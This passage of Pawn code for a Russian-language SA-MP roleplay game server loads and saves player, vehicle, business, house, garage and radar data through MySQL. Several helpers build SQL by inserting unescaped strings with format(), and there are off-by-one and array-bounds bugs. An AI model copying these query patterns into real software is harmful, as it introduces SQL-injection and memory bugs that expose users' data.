			SendClientMessage(playerid, COLOR_YELLOW, "Срок действия вашего VIP аккаунта истек!");
			PI[playerid][pVip] = PI[playerid][pVipTime] = 0;
			MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]);
			MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
		}
	}

	STRING_GLOBAL[0] = EOS;

	SendClientMessage(playerid, -1, "{ffffff}Добро пожаловать на {37c268}HOME ONLINE!");

	if(doubling_donate)
	{
		SendClientMessage(playerid, COLOR_MANDARIN, "На сервере активирован x2 день.");
		SendClientMessage(playerid, COLOR_MANDARIN, "Это значит, что зарплата во фракциях, на работах");
		SendClientMessage(playerid, COLOR_MANDARIN, "конвертация валюты (/donate), начисляется в 2 раза больше.");
	}

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL),"SELECT * FROM accounts_skills WHERE owner=%d", PI[playerid][pID]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "LoadPlayerSkills", "d", playerid);
	return 1;
}

stock LoadOwnableVehicles(playerid)
{
	STRING_GLOBAL[0] = '\0';
	mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT id FROM ownable_cars WHERE owner_name='%s' ORDER BY slot", GetName(playerid));
	new Cache:result = mysql_query(dbHandle, STRING_GLOBAL);

	new rows = cache_num_rows();

	if(!rows){
		cache_delete(result);
		return 1;
	}

	new dbID[4];
	for(new idx; idx < rows; idx ++)
	{
		dbID[idx] = cache_get_field_content_int(idx, "id", dbHandle);
	}
	for(new idx; idx < rows; idx++)
	{
		if(dbID[idx] == 0) continue;
		LoadPlayerOwnableCar(playerid, dbID[idx]);
	}
	return 1;
}

forward LoadPlayerItem(playerid);
public LoadPlayerItem(playerid)
{
    new rows, fields, maximum[11];
    cache_get_data(rows, fields);
    if(rows)
    {
        for(new f=0,st[50],st2[50],st3[50];f<MAX_SLOT;f++)
        {
            new Value[32];
            format(st,sizeof st,"Slot%i",f);
            format(st2,sizeof st2,"Amt%i",f);
            format(st3,sizeof st3,"Value%i",f);
            cache_get_field_content(0, st, maximum), PlayerInventory[playerid][f][ItemIconIndex] = strval(maximum);
            cache_get_field_content(0, st2, maximum), PlayerInventory[playerid][f][ItemCount] = strval(maximum);
            cache_get_field_content(0, st3, Value); format(PlayerItem3[playerid][f],32,"%s",Value);
        }
    }
    else if(!rows)
    {
        STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO "T_INVENT" (`Name`) VALUES ('%s')", GetName(playerid));
		mysql_query(dbHandle, STRING_GLOBAL,false);
		ResetItem(playerid);
    }
	return true;
}

forward SaveItem(p,i);
public SaveItem(p,i)
{
	if(PlayerInventory[p][i][ItemIconIndex]<0){PlayerInventory[p][i][ItemIconIndex]=0;}
	if(PlayerInventory[p][i][ItemIconIndex]<=0)
	{
	    PlayerInventory[p][i][ItemIconIndex]=0;
		PlayerInventory[p][i][ItemCount]=0;
		format(PlayerItem3[p][i],1,"");
	}
	//new string[90];
	//format(string,sizeof(string),"UPDATE "T_INVENT" SET"),strcat(query,string);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"UPDATE "T_INVENT" SET `Slot%i`='%i', `Amt%i`='%i', `Value%i`='%s' WHERE `Name` = '%s'",i,PlayerInventory[p][i][ItemIconIndex],i,PlayerInventory[p][i][ItemCount],i,PlayerItem3[p][i],GetName(p));

	/*format(string,sizeof(string),"`Slot%i`='%i',",i,PlayerItem1[p][i]),strcat(query,string);
	format(string,sizeof(string),"`Amt%i`='%i',",i,PlayerItem2[p][i]),strcat(query,string);
	format(string,sizeof(string),"`Value%i`='%s' ",i,PlayerItem3[p][i]),strcat(query,string);
	format(string,sizeof(string),"WHERE `Name`='%s'",GetName(p)),strcat(query,string);*/
	mysql_query(dbHandle ,STRING_GLOBAL);
	return true;
}
stock ClearSlot(playerid, slot) {
    PlayerInventory[playerid][slot][ItemIconIndex] = 0;
	PlayerInventory[playerid][slot][ItemCount] = 0;
}
stock ResetItem(playerid)
{
	for(new f = 16; f > 0; f --)
	{
	    PlayerItem1[playerid][f]=0;
	    PlayerItem2[playerid][f]=0;
	    format(PlayerItem3[playerid][f],1,"");
	}
}

stock MysqlUpdatePlayerStr(playerid, field[], data[])
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET %s = '%s' WHERE name = '%s'", field, data, GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

stock MysqlUpdatePlayerInt(playerid, field[], data[])
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET %s = '%i' WHERE name = '%s'", field, data, GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

stock MysqlUpdateHouseStr(idx, field[], data[])
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET %s = '%s' WHERE id = '%d' LIMIT 1", field, data, idx);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

stock MysqlUpdateHouseInt(idx, field[], data)
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET %s = '%d' WHERE id = '%d' LIMIT 1", field, data, idx);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

stock MysqlUpdateBizzStr(idx, field[], data[])
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_BIZZ" SET %s = '%s' WHERE id = '%d' LIMIT 1", field, data, idx);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

stock MysqlUpdateBizzInt(idx, field[], data)
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_BIZZ" SET %s = '%d' WHERE id = '%d' LIMIT 1", field, data, idx);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

stock MysqlUpdateOtherStr(field[], data[])
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_OTHER" SET %s = '%s' LIMIT 1", field, data);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

stock MysqlUpdateOtherInt(field[], data)
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_OTHER" SET %s = '%d' LIMIT 1", field, data);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

stock MysqlUpdateGangInt(field[], data)
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_GANG" SET %s = '%d' LIMIT 1", field, data);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

stock MysqlUpdateMafiaInt(field[], data)
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_MAFIA" SET %s = '%d' LIMIT 1", field, data);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
}

forward LoadVeh();
public LoadVeh()
{
	new time = GetTickCount();
	new rows, fields;
	cache_get_data(rows, fields);
	for(new idx = 1; idx <= rows; idx++)
	{
    	VehInfo[idx][vID] = cache_get_row_int(idx-1, 0, dbHandle); // id
		VehInfo[idx][vModel] = cache_get_row_int(idx-1, 1, dbHandle); // model
    	VehInfo[idx][vPos_X] = cache_get_row_float(idx-1, 2, dbHandle); // x
    	VehInfo[idx][vPos_Y] = cache_get_row_float(idx-1, 3, dbHandle); // y
    	VehInfo[idx][vPos_Z] = cache_get_row_float(idx-1, 4, dbHandle); // z
    	VehInfo[idx][vPos_FA] = cache_get_row_float(idx-1, 5, dbHandle); // fa
    	VehInfo[idx][vInt] = cache_get_row_int(idx-1, 6, dbHandle); // vint
    	VehInfo[idx][vWorld] = cache_get_row_int(idx-1, 7, dbHandle); // world
    	cache_get_row(idx-1, 8, VehInfo[idx][vColors], dbHandle, 32); // colors
    	VehInfo[idx][vFraction] = cache_get_row_int(idx-1, 9, dbHandle); // fraction
		VehInfo[idx][vStatus] = cache_get_row_int(idx-1, 10, dbHandle); // status
		VehInfo[idx][vCost] = cache_get_row_int(idx-1, 11, dbHandle); // cost
		cache_get_row(idx-1, 12, VehInfo[idx][veh_number], dbHandle, 32); //тип номера
		cache_get_row_int(idx-1, 13, VehInfo[idx][veh_type_num], dbHandle); //тип номера

        sscanf(VehInfo[idx][vColors], "p<,>a<i>[2]", VehInfo[idx][vColor]);
		VehInfo[idx][vVehicle] = CreateVehicle(VehInfo[idx][vModel], VehInfo[idx][vPos_X], VehInfo[idx][vPos_Y], VehInfo[idx][vPos_Z], VehInfo[idx][vPos_FA], VehInfo[idx][vColor][0], VehInfo[idx][vColor][1], 600);
		LinkVehicleToInterior(VehInfo[idx][vVehicle], VehInfo[idx][vInt]);

		//
		SetVehicleVirtualWorld(VehInfo[idx][vVehicle], VehInfo[idx][vWorld]);
 		SetVehicleNumberPlate(VehInfo[idx][vVehicle], VehInfo[idx][veh_number]);
		//
		TOTALVEH++;
	}
	printf("[Загружено орг/раб. автомобилей]: <%i>. Потрачено: <%i ms>.", TOTALVEH, GetTickCount() - time);
	return 1;
}

forward LoadAutoSalonCars();
public LoadAutoSalonCars()
{
	new time = GetTickCount(), rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
		new Float:x, Float:y, Float:z, Float:a, vehicleid, model, color1, color2;
		for(new i = 1; i < rows; i++)
		{
			model = cache_get_row_int(i-1, 1, dbHandle); // model
			x = cache_get_row_float(i-1, 2, dbHandle); // x
			y = cache_get_row_float(i-1, 3, dbHandle); // y
			z = cache_get_row_float(i-1, 4, dbHandle); // z
			a = cache_get_row_float(i-1, 5, dbHandle); // a
			color1 = cache_get_row_int(i-1, 7, dbHandle);
			color2 = cache_get_row_int(i-1, 8, dbHandle);
			vehicleid = CreateVehicle(model, x, y, z, a, color1, color2, -1);

			g_vehicle[vehicleid][veh_sql_id] = cache_get_row_int(i-1, 0, dbHandle); // id
			g_vehicle[vehicleid][veh_price] = cache_get_row_int(i-1, 6, dbHandle);
			g_vehicle[vehicleid][veh_fuel] = 100;
			g_vehicle[vehicleid][veh_autosalon] = true;
			g_vehicle[vehicleid][veh_model] = model;
			g_vehicle[vehicleid][veh_color][0] = color1;
			g_vehicle[vehicleid][veh_color][1] = color2;
			g_vehicle[vehicleid][veh_x] = x;
			g_vehicle[vehicleid][veh_y] = y;
			g_vehicle[vehicleid][veh_z] = z;
			g_vehicle[vehicleid][veh_a] = a;
		}
	}
	printf("[Загружено авт. автомобилей]: <%i>. Потрачено: <%i ms>.", rows, GetTickCount() - time);
	return 1;
}
forward LoadATM();
public LoadATM()
{
	new time = GetTickCount(), rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
		for(new idx = 1; idx <= rows; idx++)
		{
			ATMInfo[idx][aID] = cache_get_row_int(idx-1, 0, dbHandle); // ID
			ATMInfo[idx][aX] = cache_get_row_float(idx-1, 1, dbHandle); // aX
			ATMInfo[idx][aY] = cache_get_row_float(idx-1, 2, dbHandle); // aY
			ATMInfo[idx][aZ] = cache_get_row_float(idx-1, 3, dbHandle); // aZ
			ATMInfo[idx][arX] = cache_get_row_float(idx-1, 4, dbHandle); // arX
			ATMInfo[idx][arY] = cache_get_row_float(idx-1, 5, dbHandle); // arY
			ATMInfo[idx][arZ] = cache_get_row_float(idx-1, 6, dbHandle); // arZ
        	TOTALATM++;
			ATM[idx] = CreateObject(2942, ATMInfo[idx][aX], ATMInfo[idx][aY], ATMInfo[idx][aZ], ATMInfo[idx][arX], ATMInfo[idx][arY], ATMInfo[idx][arZ]);
			LABELATM[idx] = CreateDynamic3DTextLabel("Банкомат\n{FFFFFF}Нажмите: ALT", 0xBBBBBBFF, ATMInfo[idx][aX],ATMInfo[idx][aY],ATMInfo[idx][aZ]+1.1,10.0);
        }
    }
	printf("[Загружено банкоматов]: <%i>. Потрачено: <%i ms>.", TOTALATM, GetTickCount() - time);
	return 1;
}

forward LoadRadar();
public LoadRadar()
{
	new stringss[512], time = GetTickCount(), rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
		for(new idx = 1; idx <= rows; idx++)
		{
			RI[idx][r_id] = cache_get_row_int(idx-1, 0, dbHandle);
			cache_get_row(idx-1, 1, RI[idx][r_name], dbHandle, 24);
			RI[idx][r_type] = cache_get_row_int(idx-1, 2, dbHandle);
			RI[idx][r_speed] = cache_get_row_int(idx-1, 3, dbHandle);
			RI[idx][r_x] = cache_get_row_float(idx-1, 4, dbHandle);
			RI[idx][r_y] = cache_get_row_float(idx-1, 5, dbHandle);
			RI[idx][r_z] = cache_get_row_float(idx-1, 6, dbHandle);
			RI[idx][r_a] = cache_get_row_float(idx-1, 7, dbHandle);
        	format(stringss, sizeof stringss, "Радар №%d\n\n{FFFFFF}Макс. разрешенная скорость: %d КМ/Ч", TOTALRADAR, RI[idx][r_speed]);
        	RI[idx][r_object] = CreateDynamicObject(18880, RI[idx][r_x], RI[idx][r_y], RI[idx][r_z], 0.0, 0.0, RI[idx][r_a]);
        	RI[idx][r_label] = CreateDynamic3DTextLabel(stringss, 0xBBBBBBFF, RI[idx][r_x], RI[idx][r_y], RI[idx][r_z]+4.0,10.0);
        	TOTALRADAR++;

			RI[idx][r_area] = CreateDynamicSphere(RI[idx][r_x], RI[idx][r_y], RI[idx][r_z], 15.0);
		}
	}
	return printf("[Загружено радаров]: <%i>. Потрачено: <%i ms>.", TOTALRADAR, GetTickCount() - time);
}

forward LoadBizz();
public LoadBizz()
{
	new time = GetTickCount(), rows, fields, status[32];
	cache_get_data(rows, fields);
	for(new i = TOTALBIZZ; i > 0; i --) strmid(BizzInfo[i][bOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
	if(rows)
	{
		for(new idx = 1; idx <= rows; idx++)
		{
		    BizzInfo[idx][bID] = cache_get_row_int(idx-1, 0, dbHandle); // id
			cache_get_row(idx-1, 1, BizzInfo[idx][bOwner], dbHandle, MAX_PLAYER_NAME); // owner
			BizzInfo[idx][bType] = cache_get_row_int(idx-1, 2, dbHandle); // type
			BizzInfo[idx][bPrice] = cache_get_row_int(idx-1, 3, dbHandle); // price
			BizzInfo[idx][bBuyPrice] = cache_get_row_int(idx-1, 4, dbHandle); // buyprice
			BizzInfo[idx][bMoney] = cache_get_row_int(idx-1, 5, dbHandle); // money
			BizzInfo[idx][bEntrx] = cache_get_row_float(idx-1, 7, dbHandle); // x
			BizzInfo[idx][bEntry] = cache_get_row_float(idx-1, 8, dbHandle); // y
			BizzInfo[idx][bEntrz] = cache_get_row_float(idx-1, 9, dbHandle); // z
			BizzInfo[idx][bExitx] = cache_get_row_float(idx-1, 10, dbHandle); // xt
			BizzInfo[idx][bExity] = cache_get_row_float(idx-1, 11, dbHandle); // yt
			BizzInfo[idx][bExitz] = cache_get_row_float(idx-1, 12, dbHandle); // zt
			BizzInfo[idx][B_ENTER_X] = cache_get_row_float(idx-1, 13, dbHandle); // menux
			BizzInfo[idx][B_ENTER_Y] = cache_get_row_float(idx-1, 14, dbHandle); // menuy
			BizzInfo[idx][B_ENTER_Z] = cache_get_row_float(idx-1, 15, dbHandle); // menuz
			BizzInfo[idx][B_ENTER_A] = cache_get_row_float(idx-1, 16, dbHandle); // menuz
			BizzInfo[idx][bInt] = cache_get_row_int(idx-1, 17, dbHandle); // vint
			BizzInfo[idx][bVirtual] = cache_get_row_int(idx-1, 18, dbHandle); // virt
			BizzInfo[idx][bMIcon] = cache_get_row_int(idx-1, 19, dbHandle); // icon
			cache_get_row(idx-1, 20, BizzInfo[idx][bName], dbHandle, 32); // name
			BizzInfo[idx][bEnter] = cache_get_row_int(idx-1, 21, dbHandle); // penter
			BizzInfo[idx][bLock] = cache_get_row_int(idx-1, 22, dbHandle); // block
			BizzInfo[idx][bProduct] = cache_get_row_int(idx-1, 23, dbHandle); // product
			BizzInfo[idx][bTill] = cache_get_row_int(idx-1, 24, dbHandle); // till
			BizzInfo[idx][bLockTime] = cache_get_row_int(idx-1, 25, dbHandle); // locktime
			BizzInfo[idx][bControl] = cache_get_row_int(idx-1, 26, dbHandle); // mafia
			BizzInfo[idx][bOplata] = cache_get_row_int(idx-1, 27, dbHandle); // mafia
			switch(BizzInfo[idx][bControl])
			{
			   	case TEAM_OPG1: MafiaTotalBizz[0]++;
			   	case TEAM_RSM: MafiaTotalBizz[1]++;
			}
			switch(BizzInfo[idx][bControl])
			{
				case TEAM_YAK: status = "none";
				case TEAM_OPG1: status = "Итальянская Мафия";
				case TEAM_RSM: status = "Русская Мафия";
				case 0: status = "Отсутствует";
			}
			BizzInfo[idx][bIcon] = CreateDynamicMapIcon(BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz], BizzInfo[idx][bMIcon], 0,-1,-1,-1,200.0);
			new fee[64], string[200];
			if(BizzInfo[idx][bEnter] == 0) fee = "Бесплатный";
			else format(fee, sizeof(fee), "%dр", BizzInfo[idx][bEnter]);
			if(BizzInfo[idx][bType] != 2 && BizzInfo[idx][bType] != 7)
			{
				BizzInfo[idx][bPickup] = CreatePickup(19132,1, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]);
				BizzInfo[idx][bPickupExit] = CreatePickup(19132,1,BizzInfo[idx][bExitx], BizzInfo[idx][bExity], BizzInfo[idx][bExitz],BizzInfo[idx][bVirtual]);
				BizzInfo[idx][bMenu] = CreateDynamicSphere(g_business_info[BizzInfo[idx][bType]-1][BI_MENU_X], g_business_info[BizzInfo[idx][bType]-1][BI_MENU_Y], g_business_info[BizzInfo[idx][bType]-1][BI_MENU_Z],1.0,BizzInfo[idx][bVirtual],BizzInfo[idx][bInt]);
				if(BizzInfo[idx][bType] == 8) CreateDynamicPickup(1275,1,g_business_info[BizzInfo[idx][bType]-1][BI_MENU_X], g_business_info[BizzInfo[idx][bType]-1][BI_MENU_Y], g_business_info[BizzInfo[idx][bType]-1][BI_MENU_Z],BizzInfo[idx][bVirtual],BizzInfo[idx][bInt]);
				else CreateDynamicPickup(1274,1,g_business_info[BizzInfo[idx][bType]-1][BI_MENU_X], g_business_info[BizzInfo[idx][bType]-1][BI_MENU_Y], g_business_info[BizzInfo[idx][bType]-1][BI_MENU_Z],BizzInfo[idx][bVirtual],BizzInfo[idx][bInt]);
				if(!strcmp(BizzInfo[idx][bOwner],"None",true))
				{
					format(string, sizeof(string), "{33adff}%s\n{FFFFFF}Владелец: {99cc00}Государство\n{FFFFFF}Стоимость: {FFCC00}%dр\n{FFFFFF}Крышует: {FFCC00}%s", BizzInfo[idx][bName], BizzInfo[idx][bPrice], status);
					LABELBIZZ[idx] = CreateDynamic3DTextLabel(string,-1,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz]+0.5,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
				}
				else
				{
					format(string, sizeof(string), "{33adff}%s\n{FFFFFF}Владелец: {99cc00}%s\n{FFFFFF}Вход: {FFCC00}%s\n{FFFFFF}Крышует: {FFCC00}%s", BizzInfo[idx][bName], BizzInfo[idx][bOwner], fee, status);
					LABELBIZZ[idx] = CreateDynamic3DTextLabel(string,-1,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz]+0.5,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
				}
			}
			else if(BizzInfo[idx][bType] == 2)
			{
				if(!strcmp(BizzInfo[idx][bOwner],"None",true))
				{
					format(string, sizeof(string), "{ffcc33}Для заправки используйте /fill\n\n{33adff}%s\n{FFFFFF}Владелец: {99cc00}Государство\n{FFFFFF}Стоимость: {99cc00}%dр\n{FFFFFF}Крышует: {FFCC00}%s\n{FFFFFF}Цена за 1 литр бензина:{ffcc00}%iр", BizzInfo[idx][bName], BizzInfo[idx][bPrice], status, BizzInfo[idx][bTill]);
					LABELBIZZ[idx] = CreateDynamic3DTextLabel(string,-1,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz]+1,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID);
				}
				else
				{
					format(string, sizeof(string), "{ffcc33}Для заправки используйте /fill\n\n{33adff}%s\n{FFFFFF}Владелец: {99cc00}%s\n{FFFFFF}Крышует: {FFCC00}%s\n{FFFFFF}Цена за 1 литр бензина: {ffcc00}%ip", BizzInfo[idx][bName], BizzInfo[idx][bOwner], status, BizzInfo[idx][bTill]);
					LABELBIZZ[idx] = CreateDynamic3DTextLabel(string,-1,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz]+1,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID);
				}
			}
			else
			{
				if(!strcmp(BizzInfo[idx][bOwner],"None",true))
				{
					format(string, sizeof(string), "{33adff}%s\n{FFFFFF}Владелец: {99cc00}Государство\n{FFFFFF}Стоимость: {99cc00}%dр\n{FFFFFF}Крышует: {FFCC00}%s\n{FFFFFF}Цена за 1 запчасть - {ffcc00}%iр\n\n{ffcc33}H - Заехать в СТО", BizzInfo[idx][bName], BizzInfo[idx][bPrice], BizzInfo[idx][bTill], status);
					LABELBIZZ[idx] = CreateDynamic3DTextLabel(string,-1,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz],20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
				}
				else
				{
					format(string, sizeof(string), "{33adff}%s\n{FFFFFF}Владелец: {99cc00}%s\n{FFFFFF}Цена за 1 запчасть - {ffcc00}%iр\n{FFFFFF}Крышует: {FFCC00}%s\n\n{ffcc33}H - Заехать в СТО", BizzInfo[idx][bName], BizzInfo[idx][bOwner], BizzInfo[idx][bTill], status);
					LABELBIZZ[idx] = CreateDynamic3DTextLabel(string,-1,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz],20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
				}
			}
			TOTALBIZZ++;
			//Streamer_UpdateEx(playerid, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]);
        }
    }
	printf("[Загружено бизнесов]: <%i>. Потрачено: <%i ms>.", TOTALBIZZ,GetTickCount() - time);
	return 1;
}

forward LoadGarages();
public LoadGarages()
{
	new time = GetTickCount(),
		rows,
		fields,
		fmt_text[120];

	cache_get_data(rows, fields);

	for(new i = MAX_GARAGES - 1; i > 0; i --) format(g_garages[i][G_OWNER], 21, "None");

	if(rows)
	{
		for(new idx = 1; idx <= rows; idx++)
		{
		    g_garages[idx][G_SQL_ID] = cache_get_row_int(idx - 1, 0);

		    cache_get_row(idx - 1, 1, g_garages[idx][G_OWNER], dbHandle, 21);

		    g_garages[idx][G_POS_X] = cache_get_row_float(idx - 1, 2);
		    g_garages[idx][G_POS_Y] = cache_get_row_float(idx - 1, 3);
		    g_garages[idx][G_POS_Z] = cache_get_row_float(idx - 1, 4);
		    g_garages[idx][G_ANGLE] = cache_get_row_float(idx - 1, 5);

		    g_garages[idx][G_IMPROVEMENTS] = cache_get_row_int(idx - 1, 6);
		    g_garages[idx][G_PARKED_CAR] = cache_get_row_int(idx - 1, 7);

		    g_garages[idx][G_PRICE] = cache_get_row_int(idx - 1, 8);

		    new status = strcmp(g_garages[idx][G_OWNER], "None", true);

			format(fmt_text, sizeof fmt_text, "- Гараж №%d -\n%s\n{ffffff}Используйте «L.ALT» или «H»", g_garages[idx][G_SQL_ID], (!status) ? ("{66CC33}Продаётся") : ("{FF5533}Куплен"));

			g_garages[idx][G_LABEL] = CreateDynamic3DTextLabel(fmt_text, 0xFFCD00FF, g_garages[idx][G_POS_X], g_garages[idx][G_POS_Y], g_garages[idx][G_POS_Z] + 0.5, 15.0);

			TOTALGARAGES ++;
		}
	}

	printf("[Загружено гаражей]: <%i>. Потрачено: <%i ms>.", TOTALGARAGES, GetTickCount() - time);

	return 1;
}

forward LoadHouse();
public LoadHouse()
{
	new time = GetTickCount(), rows, fields;
	cache_get_data(rows, fields);
	for(new i = TOTALHOUSE; i > 0; i --) strmid(HouseInfo[i][hOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
	if(rows)
	{
		for(new idx = 1; idx <= rows; idx++)
		{
			HouseInfo[idx][hID] = cache_get_row_int(idx-1, 0, dbHandle); // id
			HouseInfo[idx][hEntrx] = cache_get_row_float(idx-1, 1, dbHandle); // hEntrx
			HouseInfo[idx][hEntry] = cache_get_row_float(idx-1, 2, dbHandle); // hEntry
			HouseInfo[idx][hEntrz] = cache_get_row_float(idx-1, 3, dbHandle); // hEntrz
			HouseInfo[idx][hExitx] = cache_get_row_float(idx-1, 4, dbHandle); // hExitx
			HouseInfo[idx][hExity] = cache_get_row_float(idx-1, 5, dbHandle); // hExity
			HouseInfo[idx][hExitz] = cache_get_row_float(idx-1, 6, dbHandle); // hExitz
			HouseInfo[idx][hCarx] = cache_get_row_float(idx-1, 7, dbHandle); // carx
			HouseInfo[idx][hCary] = cache_get_row_float(idx-1, 8, dbHandle); // cary
			HouseInfo[idx][hCarz] = cache_get_row_float(idx-1, 9, dbHandle); // carz
			HouseInfo[idx][hCarfa] = cache_get_row_float(idx-1, 10, dbHandle); // carfa
			cache_get_row(idx-1, 11, HouseInfo[idx][hOwner], dbHandle, MAX_PLAYER_NAME); // hOwner
			HouseInfo[idx][hDiscript] = cache_get_row_int(idx-1, 12, dbHandle); // hDiscript
			HouseInfo[idx][hPrice] = cache_get_row_int(idx-1, 13, dbHandle); // hPrice
			HouseInfo[idx][hBuyPrice] = cache_get_row_int(idx-1, 14, dbHandle); // buyprice
			HouseInfo[idx][hInt] = cache_get_row_int(idx-1, 15, dbHandle); // hInt
			HouseInfo[idx][hVirtual] = cache_get_row_int(idx-1, 16, dbHandle); // hVirtual
			HouseInfo[idx][hLock] = cache_get_row_int(idx-1, 17, dbHandle); // hLock
			HouseInfo[idx][hOplata] = cache_get_row_int(idx-1, 18, dbHandle); // hOplata
			HouseInfo[idx][hHeal] = cache_get_row_int(idx-1, 19, dbHandle); // hHeal
			HouseInfo[idx][hGarage] = cache_get_row_int(idx-1, 20, dbHandle); // hGarage
			HouseInfo[idx][hAutoDoors] = cache_get_row_int(idx-1, 21, dbHandle); // hAutoDoors
			HouseInfo[idx][hCS] = cache_get_row_int(idx-1, 22, dbHandle); // hAutoDoors
			HouseInfo[idx][hMoney] = cache_get_row_int(idx-1, 23, dbHandle); // hAutoDoors
			HouseInfo[idx][hPatrons] = cache_get_row_int(idx-1, 24, dbHandle); // hAutoDoors
			HouseInfo[idx][hDrugs] = cache_get_row_int(idx-1, 25, dbHandle); // hAutoDoors
           	if(!strcmp(HouseInfo[idx][hOwner],"None",true))
			{
				HouseInfo[idx][hMIcon] = CreateDynamicMapIcon(HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz], 31, 0,-1,-1,-1,150.0);
				HouseInfo[idx][hPickup] = CreatePickup(1273, 1, HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz]);
			}
			else
			{
				HouseInfo[idx][hMIcon] = CreateDynamicMapIcon(HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz], 32, 0,-1,-1,-1,150.0);
				HouseInfo[idx][hPickup] = CreatePickup(1272, 1, HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz]);
			}
			if(!HouseInfo[idx][hAutoDoors])
			{
				HouseInfo[idx][hPickupExit] = CreateDynamic3DTextLabel("{FFFFFF}Для выхода введите:\n{FFCC00}/exit\n{FFFFFF}Управление домом: \n{0099FF}/hmenu",COLOR_WHITE,HouseInfo[idx][hExitx], HouseInfo[idx][hExity], HouseInfo[idx][hExitz],2.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,HouseInfo[idx][hVirtual],HouseInfo[idx][hInt]);
			}
			else
			{
			    HouseInfo[idx][hPickupExit] = CreateDynamic3DTextLabel("{FFFFFF}Для выхода используйте:\n {FFCC00}L.ALT\n{FFFFFF}Управление домом: \n{0099FF}/hmenu",COLOR_WHITE,HouseInfo[idx][hExitx], HouseInfo[idx][hExity], HouseInfo[idx][hExitz],2.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,HouseInfo[idx][hVirtual],HouseInfo[idx][hInt]);
			}
			//Streamer_UpdateEx(playerid, HouseInfo[idx][hEntrx],HouseInfo[idx][hEntry],HouseInfo[idx][hEntrz]);
			//Streamer_UpdateEx(playerid, HouseInfo[idx][hExitx],HouseInfo[idx][hExity],HouseInfo[idx][hExitz]);

			TOTALHOUSE++;
			if(HouseInfo[idx][hDiscript] != 4) UpdateCupboard(idx);
        }
    }
	printf("[Загружено домов]: <%i>. Потрачено: <%i ms>.", TOTALHOUSE, GetTickCount() - time);
	return 1;
}

forward LoadMafia();
public LoadMafia()
{
	new time = GetTickCount(), rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
	    FracBank[5] = cache_get_row_int(0, 0, dbHandle); // yakuzabank
		FracBank[6] = cache_get_row_int(0, 1, dbHandle); // lcnbank
		FracBank[7] = cache_get_row_int(0, 2, dbHandle); // rmbank
		DrugsBank[TEAM_RSM] = cache_get_row_int(0, 3, dbHandle); // yakuzadrugs
